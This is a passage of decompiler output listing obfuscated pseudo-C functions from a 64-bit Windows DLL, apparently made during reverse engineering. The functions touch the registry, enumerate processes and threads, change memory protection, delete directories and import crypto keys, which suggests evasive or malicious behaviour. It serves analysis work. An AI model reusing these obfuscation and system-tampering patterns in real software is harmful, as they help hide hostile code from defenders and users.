  
  puVar2 = local_res10;
  lVar1 = FUN_180004e20();
  if (lVar1 != 0) {
    puVar2 = (undefined1 *)((ulonglong)puVar2 & unaff_R12);
  }
  return (longlong)(puVar2 + unaff_RBP + -0x18) >> 0x16;
}


```

---

## Function: FUN_180037a98 (0x180037a98)

```c

longlong FUN_180037a98(void)

{
  longlong in_RAX;
  longlong lVar1;
  ulonglong unaff_RBP;
  ulonglong in_R10;
  
  lVar1 = in_RAX * (in_R10 | 0xd81cb72acb7b0c0f);
  lVar1 = (lVar1 + -3) -
          (ulonglong)
          (SEXT816(lVar1) != SEXT816(in_RAX) * SEXT816((longlong)(in_R10 | 0xd81cb72acb7b0c0f)));
  if ((longlong)(in_R10 & unaff_RBP) < 0) {
    lVar1 = lVar1 + -1;
  }
  return lVar1;
}


```

---

## Function: FUN_180037b40 (0x180037b40)

```c

void FUN_180037b40(void)

{
  FUN_18001dac0();
  return;
}


```

---

## Function: FUN_180037bb8 (0x180037bb8)

```c

void FUN_180037bb8(undefined8 param_1,UINT param_2)

{
  LPARAM unaff_R12;
  
  SendMessageA((HWND)&stack0xffffffffffffffe8,param_2,0,unaff_R12);
  return;
}


```

---

## Function: FUN_180037c58 (0x180037c58)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_180037c58(void)

{
  longlong in_RAX;
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  longlong lVar4;
  ulonglong unaff_RBX;
  longlong unaff_RDI;
  ulonglong uVar5;
  undefined1 *puVar6;
  ulonglong *puVar7;
  ulonglong unaff_R13;
  undefined1 local_res8 [32];
  ulonglong local_18 [2];
  
  puVar7 = local_18;
  if ((longlong)unaff_R13 < 0) {
    unaff_RBX = unaff_RBX << 0xc;
  }
  uVar5 = (unaff_RDI + -0x10) - (ulonglong)(in_RAX << 0x19 < 0) >> 0x1d | unaff_RBX;
  uVar3 = 0;
  puVar6 = local_res8;
  uVar2 = 0xf755303f2cc03af3;
  uVar1 = FUN_180030548();
  if (uVar1 != 0) {
    unaff_R13 = unaff_R13 ^ uVar2;
    puVar7 = (ulonglong *)0x0;
    uVar3 = (uVar3 + 0x15) - uVar5;
    uVar2 = uVar2 + 0xac62341f666b79de;
    uVar5 = local_18[0] & uVar3;
  }
  if ((POPCOUNT(uVar5 & 0xff) & 1U) == 0) {
    lVar4 = uVar3 + unaff_RBX;
    unaff_RBX = unaff_RBX >> 0xd;
    uVar1 = uVar1 & uVar5 ^ (ulonglong)(puVar6 + (longlong)puVar7 + 5);
    uVar3 = lVar4 * 0x20000000 & uVar2;
    puVar6 = puVar6 + -1;
  }
  uVar2 = (uVar1 << 0x14 & uVar2 & unaff_R13) + unaff_R13;
  if (uVar3 == uVar5) {
    uVar2 = (uVar2 | (ulonglong)(puVar6 + -4) | 0x95bae6881b6fa692) >> 0x10 | unaff_R13;
    uVar5 = uVar5 >> 0x12 |
            (unaff_RBX | uVar1 << 0x14) + ((ulonglong)(puVar6 + -4) | 0x95bae6881b6fa692);
  }
  if (uVar5 == 0) {
    uVar2 = 0;
  }
  return uVar2;
}


```

---

## Function: FUN_180037dd8 (0x180037dd8)

```c

ulonglong FUN_180037dd8(void)

{
  longlong lVar1;
  HKEY hKey;
  LPCWSTR lpSubKey;
  longlong unaff_RSI;
  undefined1 *puVar2;
  undefined1 *puVar3;
  REGSAM samDesired;
  ulonglong in_R10;
  ulonglong uVar4;
  PHKEY in_stack_ffffffffffffffa8;
  undefined1 local_38 [8];
  undefined1 local_30 [8];
  ulonglong local_28;
  
  puVar2 = (undefined1 *)(unaff_RSI << 0x1d ^ in_R10);
  lVar1 = FUN_180044118();
  if (lVar1 != 0) {
    puVar2 = local_38;
  }
  hKey = (HKEY)0x9e62ef82;
  lpSubKey = (LPCWSTR)&DAT_1800c6f08;
  puVar3 = local_30;
  samDesired = 0x800d24c0;
  uVar4 = local_28;
  lVar1 = Thread32Next();
  if (lVar1 != 0) {
    hKey = (HKEY)((ulonglong)hKey | (ulonglong)puVar3);
    uVar4 = uVar4 | (ulonglong)puVar2;
    puVar3 = (undefined1 *)((ulonglong)puVar3 & (ulonglong)puVar2);
  }
  RegOpenKeyExW(hKey,lpSubKey,(DWORD)puVar3,samDesired,in_stack_ffffffffffffffa8);
  return uVar4 + 7 & local_28;
}


```

---

## Function: FUN_180038008 (0x180038008)

```c

longlong FUN_180038008(undefined8 param_1,undefined8 param_2,longlong param_3,longlong param_4)

{
  LSTATUS LVar1;
  longlong in_RAX;
  ulonglong uVar2;
  undefined4 extraout_var;
  longlong lVar3;
  HWND hWnd;
  ulonglong uVar4;
  ulonglong unaff_RBX;
  longlong unaff_RDI;
  longlong lVar5;
  WPARAM wParam;
  ulonglong lParam;
  HWND__ *in_R10;
  ulonglong uVar6;
  longlong in_R11;
  undefined1 *puVar7;
  longlong unaff_R12;
  PHKEY in_stack_ffffffffffffffa8;
  HWND__ local_40 [2];
  undefined1 local_38 [8];
  
  uVar4 = 0xf287ee1dda310847;
  wParam = param_3 + 0x13;
  puVar7 = (undefined1 *)(in_R11 + in_RAX);
  hWnd = (HWND)((longlong)local_40 - (longlong)in_R10);
  lParam = param_4 + 0x1eU ^ in_RAX + 0x20 + (ulonglong)(local_40 < in_R10);
  uVar2 = SendMessageA(hWnd,0xda310847,wParam,lParam);
  if (uVar2 == 0) {
    unaff_RBX = unaff_RBX >> 8;
    uVar4 = (longlong)hWnd + (uVar4 - 0x17);
    hWnd = (HWND)((longlong)&hWnd->unused + unaff_R12);
    puVar7 = &stack0xffffffffffffffa8;
    unaff_RDI = unaff_RDI - (longlong)puVar7;
    uVar2 = lParam;
  }
  uVar6 = (longlong)&in_R10->unused + unaff_RBX;
  uVar2 = uVar2 - 8;
  if ((uVar6 & uVar4) == 0) {
    unaff_RBX = unaff_RBX + uVar4;
    uVar6 = uVar6 ^ (ulonglong)puVar7;
    lParam = (longlong)&hWnd->unused + lParam;
    wParam = (longlong)in_stack_ffffffffffffffa8 - 9;
    uVar2 = uVar2 | wParam;
  }
  lVar5 = unaff_RDI + uVar2;
  if (unaff_RBX != 0) {
    puVar7 = puVar7 + -0x1f;
    lVar5 = lVar5 - (wParam + 0xf);
  }
  uVar2 = 0x2c23ed259c3a306b;
  LVar1 = RegOpenKeyExW((HKEY)&stack0xffffffffffffffd3,(LPCWSTR)0x2c23ed259c3a306b,(DWORD)local_40,
                        (REGSAM)lParam,in_stack_ffffffffffffffa8);
  lVar3 = CONCAT44(extraout_var,LVar1);
  if (lVar3 == 0) {
    lVar3 = 0;
  }
  lVar3 = lVar3 + (lParam - uVar2 | uVar2);
  if ((longlong)(uVar6 + lVar5 + (unaff_RBX ^ (ulonglong)puVar7) + 6) < 0) {
    lVar3 = (lVar3 - (longlong)local_38) + -1;
  }
  return lVar3 << 10;
}


```

---

## Function: FUN_1800381e0 (0x1800381e0)

```c

void FUN_1800381e0(void)

{
  DWORD local_10 [4];
  
  VirtualProtect((LPVOID)(DAT_1800bb18d + 0x1000),0x3c990,0x20,local_10);
  return;
}


```

---

## Function: FUN_180038218 (0x180038218)

```c

/* WARNING: Removing unreachable block (ram,0x0001800382cd) */
/* WARNING: Removing unreachable block (ram,0x00018003840e) */

void FUN_180038218(void)

{
  HANDLE pvVar1;
  longlong lVar2;
  undefined1 *puVar3;
  undefined1 *puVar4;
  int unaff_EBX;
  ulonglong unaff_RSI;
  undefined1 *puVar5;
  ulonglong unaff_R13;
  undefined1 local_138 [21];
  undefined1 auStack_123 [67];
  undefined8 uStack_e0;
  undefined1 local_a0 [8];
  undefined1 local_98 [120];
  
  puVar5 = (undefined1 *)0x0;
  uStack_e0 = 0x180038268;
  pvVar1 = OpenFileMappingW(unaff_EBX + 1,0,(LPCWSTR)0x0);
  if (pvVar1 == (HANDLE)0x0) {
    unaff_R13 = unaff_R13 + 6;
    unaff_RSI = unaff_RSI - (longlong)puVar5;
    puVar5 = puVar5 + -0x19;
  }
  puVar3 = local_a0;
  puVar4 = local_98;
  uStack_e0 = 0x18003829a;
  lVar2 = FUN_180049360();
  if (lVar2 == 0) {
    unaff_R13 = unaff_R13 ^ (ulonglong)local_138;
    puVar5 = local_138 + unaff_RSI + 0x15;
    unaff_RSI = unaff_RSI + 0x15 & (ulonglong)puVar3;
  }
  uStack_e0 = 0x180038315;
  _aligned_malloc((size_t)(puVar5 + unaff_RSI + (unaff_R13 - 0x15)),(size_t)(puVar4 + 0x1f));
  uStack_e0 = 0x1800383ce;
  FUN_1800039e8();
  return;
}


```

---

## Function: FUN_180038430 (0x180038430)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Removing unreachable block (ram,0x0001800384e1) */
/* WARNING: Removing unreachable block (ram,0x000180038627) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_180038430(undefined8 param_1,undefined8 param_2,longlong param_3,longlong param_4)

{
  longlong lVar1;
  undefined8 uVar2;
  ulonglong uVar3;
  longlong unaff_RBX;
  ulonglong uVar4;
  longlong lVar5;
  ulonglong uVar6;
  ulonglong in_R10;
  ulonglong uVar7;
  longlong lVar8;
  ulonglong uVar9;
  ulonglong in_R11;
  undefined1 local_40 [8];
  ulonglong local_38;
  
  uVar4 = param_3 + 0x1f;
  uVar3 = 0;
  lVar1 = FUN_180047430();
  if (lVar1 == 0) {
    in_R10 = in_R10 & uVar3 ^ param_4 + 0xbU;
    in_R11 = in_R11 - 3;
    uVar4 = local_38;
  }
  uVar7 = (in_R10 - 10) - (ulonglong)(0xfffffffffffffff5 < uVar3);
  lVar1 = uVar7 + (uVar4 | in_R11);
  uVar3 = unaff_RBX + 1 + (uVar3 + 10 | uVar7);
  uVar7 = (in_R11 & uVar3) << 0x14;
  uVar4 = 0;
  _DAT_4475cfbf = 0x180038519;
  RemoveDirectoryA((LPCSTR)0x4475cfe7);
  lVar8 = lVar1 + 8 + (ulonglong)((((ulonglong)local_40 | uVar4) >> 0x19 & 1) != 0);
  lVar5 = 0;
  uVar4 = _DAT_4475d00f + 0x1e;
  _DAT_4475cfbf = 0x180038556;
  lVar1 = _ftelli64((FILE *)0x3f0c8a7954aebc);
  if (lVar1 != 0) {
    uVar4 = uVar4 ^ uVar7;
  }
  uVar9 = lVar8 - (uVar4 >> 0x10);
  uVar6 = lVar5 - 6;
  _DAT_4475cfbf = 0x1800385e7;
  uVar7 = FUN_180052ec0();
  uVar4 = 0;
  if (uVar7 != 0) {
    uVar4 = (uVar7 & (uVar6 | uVar9)) >> 0x18;
  }
  uVar2 = 0x2861b1f52c9bd6a5;
  if ((POPCOUNT(((longlong)uVar3 >> 3 | uVar4) & 0xff) & 1U) == 0) {
    uVar2 = 0x2861b1f52c9bd6a2;
  }
  return uVar2;
}


```

---

## Function: FUN_180038688 (0x180038688)

```c

ulonglong FUN_180038688(void)

{
  ulonglong uVar1;
  ulonglong uVar2;
  undefined *puVar3;
  
  puVar3 = &DAT_1800c6f10;
  uVar1 = FUN_18000e190();
  uVar2 = 0;
  if (uVar1 != 0) {
    uVar2 = uVar1 ^ (ulonglong)puVar3;
  }
  return uVar2;
}


```

---

## Function: FUN_1800387a8 (0x1800387a8)

```c

void FUN_1800387a8(void)

{
  longlong unaff_RDI;
  
  FUN_1800141b8(0,unaff_RDI);
  FUN_180054050();
  return;
}


```

---

## Function: FUN_180038848 (0x180038848)

```c

void FUN_180038848(void)

{
  Process32NextW();
  FindNextFileA((HANDLE)0x0,(LPWIN32_FIND_DATAA)0x0);
  return;
}


```

---

## Function: FUN_180038920 (0x180038920)

```c

longlong FUN_180038920(void)

{
  longlong lVar1;
  longlong in_R11;
  
  lVar1 = FUN_180031af0();
  return in_R11 + lVar1 * -0x400000;
}


```

---

## Function: FUN_180038998 (0x180038998)

```c

void FUN_180038998(void)

{
  FUN_18000f9b0();
  return;
}


```

---

## Function: FUN_180038a30 (0x180038a30)

```c

/* WARNING: Removing unreachable block (ram,0x000180038a64) */

undefined8 FUN_180038a30(void)

{
  return 0;
}


```

---

## Function: FUN_180038aa8 (0x180038aa8)

```c

void FUN_180038aa8(void)

{
  FUN_180030838();
  RemoveDirectoryA((LPCSTR)0x0);
  return;
}


```

---

## Function: FUN_180038b88 (0x180038b88)

```c

/* WARNING: Removing unreachable block (ram,0x000180038c32) */
/* WARNING: Removing unreachable block (ram,0x000180038c71) */

longlong FUN_180038b88(void)

{
  longlong in_RAX;
  longlong lVar1;
  ulonglong uVar2;
  ulonglong unaff_RSI;
  ulonglong uVar3;
  ulonglong in_R11;
  ulonglong uVar4;
  longlong unaff_R14;
  
  uVar2 = 0xfbb6fe221328b73;
  uVar3 = (ulonglong)&stack0xffffffffffffffe8 & unaff_RSI;
  lVar1 = in_RAX;
  if (unaff_R14 == 0) {
    lVar1 = in_RAX * 0x200;
    in_R11 = in_R11 + unaff_RSI >> 2;
    unaff_R14 = in_RAX * -0x200;
    uVar2 = 0xfbb6fe221328b88;
    uVar3 = uVar3 + 3;
  }
  lVar1 = ((lVar1 - unaff_RSI) + 6) - unaff_R14;
  uVar4 = (ulonglong)
          (SEXT816((longlong)(in_R11 * (longlong)&stack0xffffffffffffffe8)) !=
          SEXT816((longlong)in_R11) * SEXT816((longlong)&stack0xffffffffffffffe8)) + 5;
  if ((POPCOUNT(uVar3 & uVar2 & 0xff) & 1U) != 0) {
    uVar3 = uVar3 | 0xf127c64f;
    uVar2 = uVar2 * 0x400 - uVar4;
    lVar1 = lVar1 * 0x100;
  }
  uVar3 = lVar1 - uVar3;
  if ((longlong)uVar2 < 1) {
    uVar3 = uVar3 - (longlong)&stack0xffffffffffffffe8 | uVar4;
  }
  return (longlong)uVar3 >> 0x19;
}


```

---

## Function: FUN_180038d10 (0x180038d10)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong FUN_180038d10(void)

{
  ulonglong in_RAX;
  
  return (in_RAX >> 6) - 0x1800ca;
}


```

---

## Function: FUN_180038d78 (0x180038d78)

```c

void FUN_180038d78(void)

{
  FUN_1800120a0();
  return;
}


```

---

## Function: FUN_180038de8 (0x180038de8)

```c

/* WARNING: Removing unreachable block (ram,0x000180038e19) */

ulonglong FUN_180038de8(void)

{
  ulonglong uVar1;
  longlong unaff_RSI;
  
  uVar1 = FUN_180044680();
  if (uVar1 != 0) {
    uVar1 = uVar1 + unaff_RSI;
  }
  return uVar1;
}


```

---

## Function: FUN_180038ea8 (0x180038ea8)

```c

void FUN_180038ea8(undefined8 param_1,longlong param_2)

{
  ulonglong unaff_RBX;
  undefined1 *puVar1;
  ulonglong uVar2;
  ulonglong in_R10;
  ulonglong uVar3;
  longlong lVar4;
  ulonglong uVar5;
  longlong unaff_R12;
  ulonglong unaff_R13;
  DWORD in_stack_ffffffffffffffb8;
  HKEY__ in_stack_ffffffffffffffc0;
  LPSECURITY_ATTRIBUTES in_stack_ffffffffffffffc8;
  PHKEY in_stack_ffffffffffffffd0;
  LPDWORD in_stack_ffffffffffffffd8;
  
  lVar4 = 0;
  uVar3 = in_R10 >> 0xb;
  puVar1 = &stack0xffffffffffffffd0;
  uVar2 = 0;
  FUN_18004d208(&DAT_1800d1aa6,param_2 + 9,(longlong)puVar1);
  uVar5 = lVar4 - 0xb;
  lVar4 = (uVar2 >> 0xd) * unaff_RBX;
  if ((POPCOUNT(unaff_RBX & 0xff) & 1U) != 0) {
    unaff_R13 = unaff_R13 | uVar3 ^ uVar5;
    lVar4 = (lVar4 - uVar5 & uVar5) + unaff_R12 * 0x100000;
  }
  RegCreateKeyExW((HKEY)&stack0xffffffffffffffc0,(LPCWSTR)&DAT_1800cd279,(int)unaff_RBX + 0xc,
                  (LPWSTR)(lVar4 + (unaff_R13 - (longlong)puVar1) + 1),in_stack_ffffffffffffffb8,
                  in_stack_ffffffffffffffc0.unused,in_stack_ffffffffffffffc8,
                  in_stack_ffffffffffffffd0,in_stack_ffffffffffffffd8);
  FUN_180002fc8();
  return;
}


```

---

## Function: FUN_180038fe8 (0x180038fe8)

```c

/* WARNING: Removing unreachable block (ram,0x0001800390c9) */

void FUN_180038fe8(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined8 in_RAX;
  
  FUN_180012880(param_3,in_RAX,param_3);
  GetTimeZoneInformation((LPTIME_ZONE_INFORMATION)&stack0xffffffffffffffc5);
  return;
}


```

---

## Function: FUN_180039120 (0x180039120)

```c

/* WARNING: Removing unreachable block (ram,0x000180039156) */

void FUN_180039120(void)

{
  FUN_180045328();
  return;
}


```

---

## Function: FUN_1800391e0 (0x1800391e0)

```c

undefined8 FUN_1800391e0(void)

{
  undefined8 local_28;
  
  return local_28;
}


```

---

## Function: FUN_180039240 (0x180039240)

```c

longlong FUN_180039240(void)

{
  BOOL BVar1;
  ulonglong in_RAX;
  undefined4 extraout_var;
  undefined1 *puVar2;
  LPCSTR lpPathName;
  undefined1 *puVar3;
  longlong unaff_RBX;
  ulonglong uVar4;
  ulonglong unaff_RSI;
  longlong lVar5;
  ulonglong unaff_RDI;
  ulonglong uVar6;
  undefined1 *puVar7;
  longlong in_R10;
  undefined1 *puVar8;
  ulonglong uVar9;
  ulonglong in_R11;
  undefined1 *puVar10;
  ulonglong uVar11;
  ulonglong uVar12;
  longlong unaff_R12;
  ulonglong uVar13;
  undefined1 auStack_6f [55];
  undefined1 local_38 [12];
  undefined1 auStack_2c [12];
  undefined1 local_20 [16];
  undefined1 local_10 [8];
  
  uVar4 = unaff_RBX * in_R10;
  uVar13 = unaff_R12 + 0x19;
  uVar6 = (unaff_RDI - (unaff_RDI < 6)) - 0x37;
  puVar2 = local_38 + uVar6;
  puVar3 = local_10;
  puVar7 = &stack0xfffffffffffffffe + CARRY8((ulonglong)local_38,uVar6);
  puVar10 = (undefined1 *)(in_R11 & in_RAX);
  puVar8 = puVar3;
  if ((POPCOUNT((ulonglong)puVar3 & 0xff) & 1U) == 0) {
    uVar6 = uVar6 & (ulonglong)puVar3;
    puVar7 = puVar7 + uVar6;
    in_RAX = in_RAX + 6;
    puVar10 = (undefined1 *)((ulonglong)puVar10 & (ulonglong)puVar3);
    puVar8 = (undefined1 *)((longlong)auStack_2c * 0x10000);
    puVar3 = (undefined1 *)((ulonglong)puVar3 | (ulonglong)puVar10);
    puVar2 = (undefined1 *)(((ulonglong)puVar2 | uVar4) - 0xd | unaff_RSI);
  }
  lVar5 = unaff_RSI - uVar6;
  uVar9 = (longlong)puVar8 - in_RAX;
  lpPathName = (LPCSTR)((ulonglong)puVar2 & (ulonglong)puVar10);
  if (((ulonglong)puVar7 & in_RAX) == 0) {
    puVar3 = (undefined1 *)((ulonglong)puVar3 ^ uVar9);
    puVar10 = local_20;
    puVar7 = puVar7 + uVar9;
    uVar9 = uVar9 - uVar13;
    uVar6 = (uVar6 - 0xf) + uVar4;
  }
  uVar11 = (ulonglong)puVar10 ^ uVar13;
  BVar1 = RemoveDirectoryA(lpPathName);
  if (CONCAT44(extraout_var,BVar1) == 0) {
    puVar3 = (undefined1 *)((longlong)puVar3 << 0x1a);
    uVar11 = uVar11 & uVar9;
    uVar4 = uVar4 ^ uVar13;
  }
  uVar12 = (uVar11 - 0x1a) - (ulonglong)((lVar5 >> 0x10 & 1U) != 0);
  uVar11 = ((ulonglong)puVar3 >> 0xf) + 0x19;
  puVar3 = local_38;
  uVar9 = FUN_180005a30();
  uVar13 = 0;
  if (uVar9 != 0) {
    uVar13 = uVar9 ^ uVar12;
    uVar11 = uVar11 ^ ((longlong)puVar3 << 0x1f | lVar5 >> 0x11) +
                      (uVar4 & (ulonglong)(puVar7 + uVar6)) + 0x1e + uVar11;
  }
  return uVar13 - uVar11;
}


```

---

## Function: FUN_180039398 (0x180039398)

```c

longlong FUN_180039398(void)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong unaff_RDI;
  ulonglong uVar3;
  ulonglong in_R10;
  ulonglong in_R11;
  ulonglong uVar4;
  ulonglong unaff_R12;
  longlong lVar5;
  ulonglong unaff_R13;
  longlong lVar6;
  undefined8 local_48;
  
  uVar3 = 0;
  FUN_180031578();
  uVar4 = (longlong)in_R11 >> 5;
  uVar3 = uVar3 >> 0x10;
  in_R10 = in_R10 ^ unaff_R12;
  lVar5 = 0;
  lVar6 = ((unaff_R13 & in_R11) >> 0xd) * in_R10;
  uVar1 = FUN_180048060();
  uVar2 = -unaff_RDI >> 0x19;
  if (-unaff_RDI >> 0x19 == 0) {
    unaff_RDI = unaff_RDI & unaff_RDI + lVar6;
    in_R10 = in_R10 << 0x12;
    lVar5 = -1;
    uVar2 = uVar4;
  }
  if (0 < (longlong)((uVar3 ^ (lVar5 + -0x1c) - (ulonglong)CARRY8(uVar2,unaff_RDI)) & uVar1)) {
    uVar1 = uVar1 + local_48 * -2;
    in_R10 = (in_R10 ^ local_48) - local_48;
  }
  return uVar1 - in_R10;
}


```

---

## Function: FUN_1800394b0 (0x1800394b0)

```c

/* WARNING: Type propagation algorithm not settling */

ulonglong FUN_1800394b0(void)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  undefined1 *puVar2;
  ulonglong unaff_R12;
  undefined1 *puVar3;
  undefined1 auStack_38 [32];
  
  puVar2 = &stack0xffffffffffffffe8;
  puVar3 = (undefined1 *)(unaff_R12 & in_RAX);
  uVar1 = FUN_180007af8();
  if (uVar1 == 0) {
    puVar3 = puVar3 + (longlong)(puVar2 + (longlong)&stack0xffffffffffffffe8);
    uVar1 = 0;
  }
  if ((longlong)((ulonglong)puVar3 & (ulonglong)auStack_38) < 1) {
    uVar1 = uVar1 >> 9;
  }
  return uVar1;
}


```

---

## Function: FUN_180039568 (0x180039568)

```c

/* WARNING: Removing unreachable block (ram,0x000180039605) */

ulonglong FUN_180039568(void)

{
  ulonglong uVar1;
  undefined1 *puVar2;
  longlong in_R9;
  ulonglong in_R10;
  longlong unaff_R12;
  undefined1 local_28 [16];
  
  puVar2 = local_28;
  uVar1 = FUN_180003ed8(in_R9);
  if (uVar1 == 0) {
    uVar1 = 0;
    puVar2 = puVar2 + unaff_R12 + -0xf;
  }
  if (-1 < (longlong)((ulonglong)puVar2 & uVar1)) {
    uVar1 = uVar1 ^ in_R10;
  }
  return uVar1;
}


```

---

## Function: FUN_180039658 (0x180039658)

```c

/* WARNING: Removing unreachable block (ram,0x0001800396ac) */
/* WARNING: Removing unreachable block (ram,0x000180039731) */
/* WARNING: Removing unreachable block (ram,0x000180039774) */

undefined8 FUN_180039658(void)

{
  FUN_1800511d8();
  return 0xf778fc82;
}


```

---

## Function: FUN_1800397d0 (0x1800397d0)

```c

longlong FUN_1800397d0(void)

{
  NTSTATUS NVar1;
  undefined4 extraout_var;
  PUCHAR in_stack_ffffffffffffff98;
  ULONG in_stack_ffffffffffffffa0;
  ULONG in_stack_ffffffffffffffa8;
  BCRYPT_KEY_HANDLE apvStack_3a [2];
  
  FUN_1800410d8();
  FUN_180023938();
  RemoveDirectoryA(&DAT_1800c6f18);
  NVar1 = BCryptImportKeyPair((BCRYPT_ALG_HANDLE)0x0,&stack0xffffffffffffffab,
                              (LPCWSTR)((longlong)in_stack_ffffffffffffff98 * 2 + 0x3af2dbe97bbe0eca
                                       ),apvStack_3a,in_stack_ffffffffffffff98,
                              in_stack_ffffffffffffffa0,in_stack_ffffffffffffffa8);
  return CONCAT44(extraout_var,NVar1) + -1;
}


```

---

## Function: FUN_180039ab0 (0x180039ab0)

```c

/* WARNING: Removing unreachable block (ram,0x000180039c8d) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_180039ab0(void)

{
  FindFirstFileA((LPCSTR)0x0,(LPWIN32_FIND_DATAA)0xf33b3aa4ee855c30);
  FUN_1800365d0();
  return 0x37bcf84;
}


```

---

## Function: FUN_180039cb8 (0x180039cb8)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_180039cb8(void)

{
  longlong lVar1;
  undefined1 *puVar2;
  ulonglong uVar3;
  longlong in_R9;
  ulonglong uVar4;
  ulonglong uVar5;
  ulonglong unaff_R12;
  undefined1 local_70 [64];
  longlong local_30;
  
  uVar4 = in_R9 + 0x13U | unaff_R12;
  uVar5 = 0;
  FUN_18002d9c0((unaff_R12 | 0x1800bfbaf) + 1,&DAT_1800c9e56,(int)&local_30,uVar4);
  uVar3 = 0;
  lVar1 = NtClose(0xb7a22c0f08a9a5ee);
  if (lVar1 == 0) {
    uVar3 = -uVar4;
  }
  lVar1 = FUN_180056178();
  if (lVar1 != 0) {
    uVar5 = uVar5 | uVar3;
  }
  uVar4 = 0;
  uVar3 = FUN_18004a548();
  if (uVar3 != 0) {
    uVar4 = uVar4 & (uVar5 | uVar3);
  }
  puVar2 = local_70;
  uVar3 = FUN_18002ef70();
  if (uVar3 != 0) {
    uVar4 = local_30 - 0x19;
    puVar2 = puVar2 + -4;
  }
  lVar1 = uVar4 + (uVar3 & 0xf9074117);
  uVar5 = lVar1 - 0xf9074117;
  uVar4 = _DAT_63864452 * 0x63864476 ^ uVar5;
  uVar3 = ((longlong)puVar2 * (((uVar3 & 0xf9074117) - lVar1) - 0xc | _DAT_63864452 * 0x63864476) -
          _DAT_63864452) + 0xc;
  if ((longlong)(uVar5 & uVar3) < 0) {
    uVar4 = uVar4 | uVar3;
  }
  return uVar4;
}


```

---

## Function: FUN_180039f10 (0x180039f10)

```c

/* WARNING: Removing unreachable block (ram,0x00018003a122) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong FUN_180039f10(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  LSTATUS LVar1;
  BOOL BVar2;
  longlong lVar3;
  undefined4 extraout_var;
  HKEY hKey;
  undefined4 extraout_var_00;
  undefined *puVar4;
  longlong lVar5;
  ulonglong uVar6;
  undefined1 *puVar7;
  LPCWSTR lpSubKey;
  LPCWSTR lpSubKey_00;
  ulonglong uVar8;
  int iVar9;
  longlong lVar10;
  longlong in_R11;
  ulonglong uVar11;
  ulonglong unaff_R12;
  ulonglong unaff_R13;
  PHKEY in_stack_ffffffffffffffa8;
  PHKEY phkResult;
  undefined1 auStack_4a [10];
  undefined1 local_40 [16];
  undefined1 local_30 [8];
  
  puVar4 = &DAT_1800c6f20;
  puVar7 = local_40;
  uVar8 = param_3 + 0x2c;
  lVar10 = 0x68bb7381aba49b1c;
  phkResult = in_stack_ffffffffffffffa8;
  lVar3 = FUN_180027330();
  if (lVar3 == 0) {
    uVar6 = (ulonglong)puVar7 | (ulonglong)puVar4;
    uVar8 = ((longlong)phkResult + lVar10) * 0x100000;
    in_stack_ffffffffffffffa8 = (PHKEY)((longlong)in_stack_ffffffffffffffa8 - in_R11 | unaff_R13);
    puVar4 = puVar4 + -unaff_R13;
    puVar7 = (undefined1 *)(uVar6 + unaff_R12);
  }
  uVar11 = in_R11 - 9;
  uVar6 = (longlong)in_stack_ffffffffffffffa8 * (longlong)puVar4;
  lpSubKey = (LPCWSTR)((longlong)puVar7 * lVar10);
  LVar1 = RegOpenKeyExW((HKEY)(puVar4 + 9),lpSubKey,(DWORD)uVar8,(REGSAM)lVar10,phkResult);
  iVar9 = (int)lVar10;
  hKey = (HKEY)0x0;
  if (CONCAT44(extraout_var,LVar1) != 0) {
    uVar6 = uVar6 - 8;
    unaff_R12 = unaff_R12 + uVar11 | uVar6;
    uVar8 = uVar8 >> 0xb;
    iVar9 = iVar9 - (int)(local_40 + (unaff_R12 - 0x18));
    hKey = (HKEY)((longlong)(local_40 + (unaff_R12 - 0x18)) * 0x1000000);
    lpSubKey = (LPCWSTR)(((ulonglong)lpSubKey | uVar11) ^ unaff_R12 | unaff_R12);
  }
  lpSubKey_00 = (LPCWSTR)((longlong)lpSubKey + 5);
  RegOpenKeyExW(hKey,lpSubKey_00,(int)uVar8 - (int)lpSubKey,iVar9 + 0x10,phkResult);
  if ((longlong)((uVar6 ^ uVar11) & (ulonglong)lpSubKey_00) < 0) {
    uVar11 = uVar11 + 0x18;
  }
  uVar8 = 0;
  uVar6 = (longlong)unaff_R12 >> 5;
  lVar5 = 0;
  puVar4 = &DAT_1800c213a;
  lVar3 = 0;
  lVar10 = FUN_18003ad08();
  if (lVar10 != 0) {
    uVar6 = uVar6 >> 6;
    lVar5 = lVar5 - lVar10;
    lVar3 = -((longlong)puVar4 - lVar5);
  }
  lVar3 = lVar3 + 0x16;
  puVar7 = local_30;
  BVar2 = RemoveDirectoryA((LPCSTR)(lVar5 + 0xe));
  if (CONCAT44(extraout_var_00,BVar2) == 0) {
    puVar7 = puVar7 + -0xc;
    uVar8 = uVar8 + uVar11 >> 0x16;
  }
  uVar8 = uVar8 * uVar6 * uVar11;
  lVar3 = lVar3 + uVar11;
  if ((uVar11 & 0xaed85d7a50863ba2) == 0) {
    uVar8 = uVar8 >> 0x15;
    lVar3 = lVar3 - uVar8;
    puVar7 = (undefined1 *)((ulonglong)puVar7 & uVar8);
  }
  uVar6 = (ulonglong)((ulonglong)(lVar3 >> 0x15) < 0xd);
  lVar3 = uVar6 + 0x10;
  if (-1 < (longlong)auStack_4a) {
    lVar3 = ((ulonglong)(puVar7 + (ulonglong)CARRY8(uVar8,(ulonglong)puVar7) + uVar8 + 0x1e) &
            uVar6 + 0x12) + 0xf;
  }
  return lVar3 + 0x14;
}


```

---

## Function: FUN_18003a238 (0x18003a238)

```c

/* WARNING: Removing unreachable block (ram,0x00018003a2d8) */
/* WARNING: Type propagation algorithm not settling */

undefined1 * FUN_18003a238(void)

{
  undefined1 local_30 [16];
  ulonglong local_20;
  
  FUN_18000eef0();
  RemoveDirectoryA((LPCSTR)0x0);
  FUN_1800132a0();
  GetCurrentDirectoryW((DWORD)&local_20,(LPWSTR)0x0);
  FUN_18004dc08();
  FUN_180049c88();
  return local_30;
}


```

---

## Function: FUN_18003a538 (0x18003a538)

```c

